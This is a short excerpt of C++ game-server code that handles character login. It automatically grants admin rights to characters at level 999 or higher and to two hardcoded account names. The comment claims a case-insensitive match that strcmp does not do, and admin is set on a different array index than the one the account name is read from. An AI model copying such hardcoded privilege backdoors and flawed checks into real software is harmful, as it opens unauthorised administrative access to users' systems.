...
#pragma region _MSG_DBCNFCharacterLogin
		case _MSG_DBCNFCharacterLogin:
		{
			...
			// Admin automatico para level 999 OU contas autorizadas (case-insensitive)
			char accName[64];
			strncpy(accName, pUser[conn].AccountName, sizeof(accName) - 1);
			...
			if (pMob[n].MOB.CurrentScore.Level >= 999 ||
				strcmp(accName, "felipe") == 0 ||
				strcmp(accName, "felipe2") == 0) {
				pUser[n].Admin = 1;
			}
			...
			{
				SNPRINTF_SAFE(temp, sizeof(temp), "[%s] acabou de entrar!", pMob[conn].MOB.MobName);
